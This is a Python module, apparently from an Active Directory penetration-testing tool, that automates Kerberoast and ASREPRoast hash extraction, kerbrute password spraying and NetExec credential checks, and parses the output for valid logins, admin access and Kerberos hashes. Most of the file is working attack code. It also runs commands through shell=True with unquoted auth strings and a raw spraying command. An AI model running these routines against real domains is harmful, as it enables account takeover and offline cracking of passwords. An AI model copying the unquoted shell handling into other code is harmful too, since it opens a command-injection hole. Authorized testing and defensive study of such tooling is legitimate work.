"""Credential service for credential-related operations.

This module provides services for credential verification, roasting attacks
(Kerberoast, ASREPRoast), and password spraying.
"""

from typing import Callable, Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum
import subprocess
import os
import logging
import shlex

from adscan_internal import telemetry
from adscan_internal.command_runner import CommandSpec, default_runner
from adscan_internal.services.base_service import BaseService
from adscan_internal.core import CredentialFoundEvent
from adscan_internal.subprocess_env import (
    command_string_needs_clean_env,
    get_clean_env_for_compilation,
)


logger = logging.getLogger(__name__)

CommandExecutor = Callable[[str, int], subprocess.CompletedProcess[str]]


def _default_executor(command: str, timeout: int) -> subprocess.CompletedProcess[str]:
    """Execute a shell command using the shared command runner.

    Args:
        command: Command string to execute.
        timeout: Timeout in seconds.

    Returns:
        subprocess.CompletedProcess instance.
    """
    use_clean_env = command_string_needs_clean_env(command)
    cmd_env = get_clean_env_for_compilation() if use_clean_env else None
    return default_runner.run(
        CommandSpec(
            command=command,
            timeout=timeout,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
            env=cmd_env,
        )
    )


class CredentialStatus(str, Enum):
    """Status of credential verification."""

    VALID = "valid"
    INVALID = "invalid"
    ACCOUNT_LOCKED = "account_locked"
    ACCOUNT_DISABLED = "account_disabled"
    PASSWORD_EXPIRED = "password_expired"
    USER_NOT_FOUND = "user_not_found"
    ACCOUNT_RESTRICTION = "account_restriction"
    TIMEOUT = "timeout"
    ERROR = "error"


@dataclass
class CredentialVerificationResult:
    """Result of credential verification.

    Attributes:
        status: Verification status
        username: Username tested
        domain: Domain tested against
        credential_type: Type of credential (password or hash)
        error_message: Error message if verification failed
        is_admin: Whether account has admin privileges (if detected)
        raw_output: Raw tool output when available (not serialized for security)
    """

    status: CredentialStatus
    username: str
    domain: str
    credential_type: str = "password"
    error_message: Optional[str] = None
    is_admin: bool = False
    # Raw command output is kept for in-process consumers (e.g. CLI) but is
    # intentionally excluded from serialized representations to avoid leaking
    # potentially sensitive information.
    raw_output: Optional[str] = None

    def is_valid(self) -> bool:
        """Check if credentials are valid."""
        return self.status == CredentialStatus.VALID

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "status": self.status.value,
            "username": self.username,
            "domain": self.domain,
            "credential_type": self.credential_type,
            "error_message": self.error_message,
            "is_admin": self.is_admin,
        }


@dataclass
class RoastingResult:
    """Result of a roasting attack (Kerberoast/ASREPRoast).

    Attributes:
        attack_type: Type of attack (kerberoast or asreproast)
        domain: Target domain
        hashes_found: Number of hashes extracted
        roastable_users: List of roastable usernames
        output_file: Path to output file with hashes
        success: Whether attack succeeded
        error_message: Error message if attack failed
    """

    attack_type: str  # "kerberoast" or "asreproast"
    domain: str
    hashes_found: int = 0
    roastable_users: List[str] = None
    output_file: Optional[str] = None
    success: bool = False
    error_message: Optional[str] = None

    def __post_init__(self):
        """Initialize roastable_users if None."""
        if self.roastable_users is None:
            self.roastable_users = []

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "attack_type": self.attack_type,
            "domain": self.domain,
            "hashes_found": self.hashes_found,
            "roastable_users": self.roastable_users,
            "output_file": self.output_file,
            "success": self.success,
            "error_message": self.error_message,
        }


class CredentialService(BaseService):
    """Service for credential operations.

    This service encapsulates credential-related operations including:
    - Credential verification against domain controllers
    - Kerberoast attacks
    - ASREPRoast attacks
    - Password spraying
    """

    def verify_credentials(
        self,
        domain: str,
        username: str,
        credential: str,
        pdc_fqdn: str,
        netexec_path: str,
        auth_string: str,
        log_file_path: str,
        scan_id: Optional[str] = None,
        executor: CommandExecutor | None = None,
        timeout: int = 60,
    ) -> CredentialVerificationResult:
        """Verify domain credentials against PDC.

        Args:
            domain: Domain name
            username: Username to verify
            credential: Password or NTLM hash
            pdc_fqdn: PDC fully qualified domain name
            netexec_path: Path to NetExec executable
            auth_string: Pre-built authentication string for NetExec
            log_file_path: Path to log file
            scan_id: Optional scan ID for progress tracking
            executor: Optional command executor. When not provided, a default
                subprocess-based executor is used. The CLI layer should inject
                its own executor that routes through the NetExec helpers to
                ensure clock-skew handling and retries.
            timeout: Verification timeout in seconds

        Returns:
            CredentialVerificationResult with status and details
        """
        self._emit_progress(
            scan_id=scan_id,
            phase="credential_verification",
            progress=0.0,
            message=f"Verifying credentials for {username}@{domain}",
        )

        credential_type = "hash" if self._is_ntlm_hash(credential) else "password"

        # Build command
        command = f'{netexec_path} smb {pdc_fqdn} {auth_string} --log "{log_file_path}"'

        self.logger.info(
            f"Verifying credentials for {username}@{domain} (type: {credential_type})"
        )

        self._emit_progress(
            scan_id=scan_id,
            phase="credential_verification",
            progress=0.3,
            message="Executing verification command",
        )

        # Execute verification
        try:
            exec_fn = executor or _default_executor
            result = exec_fn(command, timeout)

            output = (result.stdout or "") + (result.stderr or "")

            # Parse verification result
            verification_result = self._parse_verification_output(
                output, username, domain, credential_type
            )
            verification_result.raw_output = output

            self._emit_progress(
                scan_id=scan_id,
                phase="credential_verification",
                progress=1.0,
                message=f"Verification completed: {verification_result.status.value}",
            )

            # Emit credential found event if valid
            if verification_result.is_valid():
                self._emit_event(
                    CredentialFoundEvent(
                        scan_id=scan_id,
                        credential_type=credential_type,
                        username=username,
                        domain=domain,
                        source="verification",
                        is_admin=verification_result.is_admin,
                    )
                )

            self.logger.info(
                f"Credential verification for {username}@{domain}: {verification_result.status.value}"
            )

            return verification_result

        except subprocess.TimeoutExpired:
            telemetry.capture_exception(
                TimeoutError(
                    f"Credential verification timed out for {username}@{domain}"
                )
            )
            self.logger.error(
                f"Credential verification timed out for {username}@{domain}"
            )
            self._emit_progress(
                scan_id=scan_id,
                phase="credential_verification",
                progress=1.0,
                message="Verification timed out",
            )
            return CredentialVerificationResult(
                status=CredentialStatus.TIMEOUT,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Verification timed out",
            )

        except Exception as e:
            telemetry.capture_exception(e)
            self.logger.exception(f"Error verifying credentials: {e}")
            self._emit_progress(
                scan_id=scan_id,
                phase="credential_verification",
                progress=1.0,
                message="Verification failed with error",
            )
            return CredentialVerificationResult(
                status=CredentialStatus.ERROR,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message=str(e),
            )

    def _parse_verification_output(
        self,
        output: str,
        username: str,
        domain: str,
        credential_type: str,
    ) -> CredentialVerificationResult:
        """Parse NetExec verification output.

        Args:
            output: Command output
            username: Username tested
            domain: Domain tested
            credential_type: Type of credential

        Returns:
            CredentialVerificationResult
        """
        # Check for various status codes
        if "STATUS_LOGON_FAILURE" in output:
            return CredentialVerificationResult(
                status=CredentialStatus.INVALID,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Incorrect credentials",
            )

        if "STATUS_ACCOUNT_LOCKED_OUT" in output:
            return CredentialVerificationResult(
                status=CredentialStatus.ACCOUNT_LOCKED,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Account locked out",
            )

        if "STATUS_ACCOUNT_DISABLED" in output:
            return CredentialVerificationResult(
                status=CredentialStatus.ACCOUNT_DISABLED,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Account disabled",
            )

        if "STATUS_ACCOUNT_RESTRICTION" in output:
            return CredentialVerificationResult(
                status=CredentialStatus.ACCOUNT_RESTRICTION,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Account restricted",
            )

        if "STATUS_PASSWORD_EXPIRED" in output:
            return CredentialVerificationResult(
                status=CredentialStatus.PASSWORD_EXPIRED,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Password expired",
            )

        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in output:
            return CredentialVerificationResult(
                status=CredentialStatus.USER_NOT_FOUND,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="User not found",
            )

        if "KDC_ERR_PREAUTH_FAILED" in output:
            return CredentialVerificationResult(
                status=CredentialStatus.INVALID,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Pre-authentication failed",
            )

        # Check for success
        if "[+]" in output:
            # NetExec marks admin context with patterns like "(Pwn3d!)" or
            # "admin!" in the output. We consider any of these as admin.
            is_admin = (
                "(Pwn3d!)" in output
                or "Pwn3d!" in output
                or "admin!" in output
            )
            return CredentialVerificationResult(
                status=CredentialStatus.VALID,
                username=username,
                domain=domain,
                credential_type=credential_type,
                is_admin=is_admin,
            )

        # Unknown status
        return CredentialVerificationResult(
            status=CredentialStatus.ERROR,
            username=username,
            domain=domain,
            credential_type=credential_type,
            error_message="Unknown verification result",
        )

    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str,
        getuserspns_path: str,
        auth_string: str,
        output_file: str,
        *,
        executor: CommandExecutor | None = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,
    ) -> RoastingResult:
        """Perform Kerberoast attack.

        Args:
            domain: Target domain
            username: Authentication username
            password: Authentication password
            getuserspns_path: Path to GetUserSPNs.py (Impacket)
            auth_string: Pre-built auth string for Impacket
            output_file: Path to output file for hashes
            scan_id: Optional scan ID
            timeout: Command timeout in seconds

        Returns:
            RoastingResult with attack results
        """
        self._emit_progress(
            scan_id=scan_id,
            phase="kerberoast",
            progress=0.0,
            message=f"Starting Kerberoast attack on {domain}",
        )

        self.logger.info(f"Executing Kerberoast attack on domain: {domain}")

        # Build command
        command = (
            f"{shlex.quote(getuserspns_path)} -request {auth_string} "
            f"-target-domain {shlex.quote(domain)} -outputfile {shlex.quote(output_file)} | "
            f"awk '{{print $2}}' | grep -vE 'Name|v0.|---|CCache|Principal:' | "
            f"awk '!seen[$0]++' | awk 'NF'"
        )

        self._emit_progress(
            scan_id=scan_id,
            phase="kerberoast",
            progress=0.3,
            message="Executing Kerberoast command",
        )

        try:
            exec_fn = executor or _default_executor
            result = exec_fn(command, timeout)

            self._emit_progress(
                scan_id=scan_id,
                phase="kerberoast",
                progress=0.7,
                message="Parsing Kerberoast results",
            )

            # Parse roastable users from stdout
            roastable_users = []
            if result.stdout:
                roastable_users = [
                    line.strip() for line in result.stdout.splitlines() if line.strip()
                ]

            # Count hashes in output file
            hashes_found = 0
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    hashes_found = sum(
                        1 for line in f if line.strip() and "$krb5tgs$" in line
                    )

            self._emit_progress(
                scan_id=scan_id,
                phase="kerberoast",
                progress=1.0,
                message=f"Kerberoast completed: {hashes_found} hash(es) found",
            )

            # Emit events for discovered credentials
            for user in roastable_users[:hashes_found]:
                self._emit_event(
                    CredentialFoundEvent(
                        scan_id=scan_id,
                        credential_type="kerberos_hash",
                        username=user,
                        domain=domain,
                        source="kerberoast",
                        is_admin=False,
                    )
                )

            self.logger.info(
                f"Kerberoast completed for {domain}: {hashes_found} hash(es), "
                f"{len(roastable_users)} roastable user(s)"
            )

            return RoastingResult(
                attack_type="kerberoast",
                domain=domain,
                hashes_found=hashes_found,
                roastable_users=roastable_users,
                output_file=output_file,
                success=True,
            )

        except subprocess.TimeoutExpired:
            self.logger.error(f"Kerberoast timed out for domain {domain}")
            self._emit_progress(
                scan_id=scan_id,
                phase="kerberoast",
                progress=1.0,
                message="Kerberoast timed out",
            )
            return RoastingResult(
                attack_type="kerberoast",
                domain=domain,
                success=False,
                error_message="Kerberoast timed out",
            )

        except Exception as e:
            self.logger.exception(f"Error during Kerberoast: {e}")
            self._emit_progress(
                scan_id=scan_id,
                phase="kerberoast",
                progress=1.0,
                message="Kerberoast failed",
            )
            return RoastingResult(
                attack_type="kerberoast",
                domain=domain,
                success=False,
                error_message=str(e),
            )

    def asreproast(
        self,
        domain: str,
        users_file: str,
        getnpusers_path: str,
        output_file: str,
        pdc: Optional[str] = None,
        auth_string: Optional[str] = None,
        netexec_path: Optional[str] = None,
        log_file: Optional[str] = None,
        *,
        executor: CommandExecutor | None = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,
    ) -> RoastingResult:
        """Perform ASREPRoast attack.

        Args:
            domain: Target domain
            users_file: Path to users list file
            getnpusers_path: Path to GetNPUsers.py (Impacket)
            output_file: Path to output file for hashes
            pdc: PDC IP (optional, for authenticated mode with NetExec)
            auth_string: Auth string (optional, for authenticated mode)
            netexec_path: Path to NetExec (optional, for authenticated mode)
            scan_id: Optional scan ID
            timeout: Command timeout in seconds

        Returns:
            RoastingResult with attack results
        """
        self._emit_progress(
            scan_id=scan_id,
            phase="asreproast",
            progress=0.0,
            message=f"Starting ASREPRoast attack on {domain}",
        )

        self.logger.info(f"Executing ASREPRoast attack on domain: {domain}")

        # Choose command based on authentication mode
        if netexec_path and auth_string and pdc:
            # Authenticated mode with NetExec
            log_part = f" --log {shlex.quote(log_file)}" if log_file else ""
            command = (
                f"{shlex.quote(netexec_path)} ldap {shlex.quote(pdc)} {auth_string} "
                f"--kdcHost {shlex.quote(pdc)} --asreproast {shlex.quote(output_file)}{log_part} | "
                f"grep -P '\\$krb5asrep\\$23\\$([^@]+)@' | "
                f"sed -E 's/.*\\$krb5asrep\\$23\\$([^@]+)@.*/\\1/'"
            )
        else:
            # Unauthenticated mode with GetNPUsers
            command = (
                f"{shlex.quote(getnpusers_path)} {shlex.quote(domain + '/')} "
                f"-usersfile {shlex.quote(users_file)} "
                f"-format hashcat -outputfile {shlex.quote(output_file)} | "
                f"grep 'krb5asrep' | tr -t '\\$' ' ' | tr -t '@' ' ' | awk '{{print $3}}'"
            )

        self._emit_progress(
            scan_id=scan_id,
            phase="asreproast",
            progress=0.3,
            message="Executing ASREPRoast command",
        )

        try:
            exec_fn = executor or _default_executor
            result = exec_fn(command, timeout)

            self._emit_progress(
                scan_id=scan_id,
                phase="asreproast",
                progress=0.7,
                message="Parsing ASREPRoast results",
            )

            # Parse roastable users from stdout
            roastable_users = []
            if result.stdout:
                roastable_users = [
                    line.strip() for line in result.stdout.splitlines() if line.strip()
                ]

            # Count hashes in output file
            hashes_found = 0
            if os.path.exists(output_file):
                with open(output_file, "r") as f:
                    hashes_found = sum(
                        1 for line in f if line.strip() and "$krb5asrep$" in line
                    )

            self._emit_progress(
                scan_id=scan_id,
                phase="asreproast",
                progress=1.0,
                message=f"ASREPRoast completed: {hashes_found} hash(es) found",
            )

            # Emit events for discovered credentials
            for user in roastable_users[:hashes_found]:
                self._emit_event(
                    CredentialFoundEvent(
                        scan_id=scan_id,
                        credential_type="asrep_hash",
                        username=user,
                        domain=domain,
                        source="asreproast",
                        is_admin=False,
                    )
                )

            self.logger.info(
                f"ASREPRoast completed for {domain}: {hashes_found} hash(es), "
                f"{len(roastable_users)} roastable user(s)"
            )

            return RoastingResult(
                attack_type="asreproast",
                domain=domain,
                hashes_found=hashes_found,
                roastable_users=roastable_users,
                output_file=output_file,
                success=True,
            )

        except subprocess.TimeoutExpired:
            self.logger.error(f"ASREPRoast timed out for domain {domain}")
            self._emit_progress(
                scan_id=scan_id,
                phase="asreproast",
                progress=1.0,
                message="ASREPRoast timed out",
            )
            return RoastingResult(
                attack_type="asreproast",
                domain=domain,
                success=False,
                error_message="ASREPRoast timed out",
            )

        except Exception as e:
            self.logger.exception(f"Error during ASREPRoast: {e}")
            self._emit_progress(
                scan_id=scan_id,
                phase="asreproast",
                progress=1.0,
                message="ASREPRoast failed",
            )
            return RoastingResult(
                attack_type="asreproast",
                domain=domain,
                success=False,
                error_message=str(e),
            )

    def _is_ntlm_hash(self, credential: str) -> bool:
        """Check if credential is an NTLM hash.

        Args:
            credential: Credential to check

        Returns:
            True if NTLM hash, False otherwise
        """
        return len(credential) == 32 and all(
            c in "0123456789abcdef" for c in credential.lower()
        )

    def verify_local_credentials(
        self,
        domain: str,
        username: str,
        credential: str,
        host: str,
        service: str,
        netexec_path: str,
        auth_string: str,
        log_file_path: str,
        *,
        executor: CommandExecutor | None = None,
        scan_id: Optional[str] = None,
        timeout: int = 60,
    ) -> CredentialVerificationResult:
        """Verify host-specific credentials for a given service using NetExec.

        This is the service-layer equivalent of the legacy ``check_local_creds``
        logic in ``adscan.py``. It focuses on classification of the NetExec
        output and returns a rich result object without performing any CLI
        printing. The CLI layer is responsible for mapping statuses to user
        messaging and follow-up actions.

        Args:
            domain: Domain context used for logging/telemetry.
            username: Username to verify.
            credential: Password or hash.
            host: Target host (IP or hostname).
            service: Service to target (e.g., smb, winrm, rdp).
            netexec_path: Path to NetExec executable.
            auth_string: Pre-built authentication string for NetExec.
            log_file_path: Path to log file.
            executor: Optional command executor. When not provided, a default
                subprocess-based executor is used. The CLI layer should inject
                its own executor that routes through the NetExec helpers.
            scan_id: Optional scan ID for progress tracking.
            timeout: Verification timeout in seconds.

        Returns:
            CredentialVerificationResult describing the verification outcome.
        """
        self._emit_progress(
            scan_id=scan_id,
            phase="local_credential_verification",
            progress=0.0,
            message=(
                f"Verifying local credentials for {username}@{host} "
                f"via {service} in domain {domain}"
            ),
        )

        credential_type = "hash" if self._is_ntlm_hash(credential) else "password"
        local_timeout_arg = (
            " --smb-timeout 10"
            if str(service or "").strip().lower() == "smb"
            else ""
        )
        command = (
            f"{shlex.quote(netexec_path)} {shlex.quote(service)} "
            f"{shlex.quote(host)} {auth_string}{local_timeout_arg} "
            f"--log {shlex.quote(log_file_path)} "
        )

        self.logger.info(
            "Verifying local credentials for %s@%s (domain=%s, service=%s, type=%s)",
            username,
            host,
            domain,
            service,
            credential_type,
        )

        try:
            exec_fn = executor or _default_executor
            result = exec_fn(command, timeout)

            output = (result.stdout or "") + (result.stderr or "")

            verification_result = self._parse_verification_output(
                output, username, domain, credential_type
            )
            verification_result.raw_output = output

            self._emit_progress(
                scan_id=scan_id,
                phase="local_credential_verification",
                progress=1.0,
                message=(
                    f"Local credential verification completed: "
                    f"{verification_result.status.value}"
                ),
            )

            self.logger.info(
                "Local credential verification for %s@%s (domain=%s, service=%s): %s",
                username,
                host,
                domain,
                service,
                verification_result.status.value,
            )

            # Emit event when credentials are valid so higher layers can react.
            if verification_result.is_valid():
                self._emit_event(
                    CredentialFoundEvent(
                        scan_id=scan_id,
                        credential_type=credential_type,
                        username=username,
                        domain=domain,
                        source=f"local_{service}",
                        is_admin=verification_result.is_admin,
                    )
                )

            return verification_result

        except subprocess.TimeoutExpired:
            telemetry.capture_exception(
                TimeoutError(
                    f"Local credential verification timed out for {username}@{host}"
                )
            )
            self.logger.error(
                "Local credential verification timed out for %s@%s (domain=%s, service=%s)",
                username,
                host,
                domain,
                service,
            )
            self._emit_progress(
                scan_id=scan_id,
                phase="local_credential_verification",
                progress=1.0,
                message="Local credential verification timed out",
            )
            return CredentialVerificationResult(
                status=CredentialStatus.TIMEOUT,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message="Local credential verification timed out",
            )

        except Exception as e:
            telemetry.capture_exception(e)
            self.logger.exception(
                "Error verifying local credentials for %s@%s (domain=%s, service=%s): %s",
                username,
                host,
                domain,
                service,
                e,
            )
            self._emit_progress(
                scan_id=scan_id,
                phase="local_credential_verification",
                progress=1.0,
                message="Local credential verification failed with error",
            )
            return CredentialVerificationResult(
                status=CredentialStatus.ERROR,
                username=username,
                domain=domain,
                credential_type=credential_type,
                error_message=str(e),
            )

    def execute_password_spraying(
        self,
        command: str,
        domain: str,
        *,
        executor: CommandExecutor | None = None,
        scan_id: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Execute password spraying command and parse results.

        Args:
            command: Full kerbrute command string to execute.
            domain: Target domain name.
            executor: Optional command executor. When not provided, uses default
                subprocess executor. The CLI layer should inject its own executor
                that routes through shell.run_command to ensure clean_env handling.
            scan_id: Optional scan ID for progress tracking.

        Returns:
            Dictionary with:
            - success: bool - Whether command executed successfully
            - found_credentials: bool - Whether any valid credentials were found
            - credentials: List[Dict[str, str]] - List of found credentials
                (each with 'username' and 'password')
            - returncode: int - Command return code
            - stdout: str - Command stdout (stripped of ANSI codes)
            - stderr: str - Command stderr (stripped of ANSI codes)
        """
        from adscan_internal.text_utils import strip_ansi_codes

        self._emit_progress(
            scan_id=scan_id,
            phase="password_spraying",
            progress=0.0,
            message=f"Executing password spraying on {domain}",
        )

        executor_func = executor or _default_executor
        credentials_found = []

        try:
            self.logger.info(
                f"Executing password spraying command on {domain}",
                extra={"command": command, "domain": domain},
            )

            self._emit_progress(
                scan_id=scan_id,
                phase="password_spraying",
                progress=0.5,
                message="Running kerbrute command...",
            )

            # Execute command (no timeout for spraying - can take a long time)
            completed = executor_func(command, timeout=None)

            self._emit_progress(
                scan_id=scan_id,
                phase="password_spraying",
                progress=0.8,
                message="Parsing results...",
            )

            # Process output
            raw_output = completed.stdout or ""
            raw_stderr = completed.stderr or ""
            output = strip_ansi_codes(raw_output)
            stderr_output = strip_ansi_codes(raw_stderr)
            output_lines = output.splitlines() if output else []

            # Parse valid logins from output
            for line in output_lines:
                line_stripped = line.strip()
                if not line_stripped:
                    continue

                if "VALID LOGIN" in line_stripped:
                    try:
                        creds = line_stripped.split("VALID LOGIN:")[1].strip()
                        user_domain, password = creds.split(":")
                        username = user_domain.split("@")[0]
                        credentials_found.append(
                            {"username": username, "password": password}
                        )
                        self.logger.info(
                            f"Found valid credentials: {username}@{domain}",
                            extra={"username": username, "domain": domain},
                        )
                    except Exception:
                        self.logger.warning(
                            f"Failed to parse credentials from line: {line_stripped}",
                            exc_info=True,
                        )

            self._emit_progress(
                scan_id=scan_id,
                phase="password_spraying",
                progress=1.0,
                message="Password spraying completed",
            )

            return {
                "success": completed.returncode == 0,
                "found_credentials": len(credentials_found) > 0,
                "credentials": credentials_found,
                "returncode": completed.returncode,
                "stdout": output,
                "stderr": stderr_output,
            }

        except subprocess.TimeoutExpired:
            self.logger.error(
                f"Password spraying command timed out for {domain}",
                extra={"command": command, "domain": domain},
            )
            self._emit_progress(
                scan_id=scan_id,
                phase="password_spraying",
                progress=1.0,
                message="Password spraying timed out",
            )
            return {
                "success": False,
                "found_credentials": False,
                "credentials": [],
                "returncode": -1,
                "stdout": "",
                "stderr": "Command timed out",
            }

        except Exception as e:
            telemetry.capture_exception(e)
            self.logger.exception(
                f"Error executing password spraying command for {domain}",
                extra={"command": command, "domain": domain},
                exc_info=True,
            )
            self._emit_progress(
                scan_id=scan_id,
                phase="password_spraying",
                progress=1.0,
                message="Password spraying failed with error",
            )
            return {
                "success": False,
                "found_credentials": False,
                "credentials": [],
                "returncode": -1,
                "stdout": "",
                "stderr": str(e),
            }
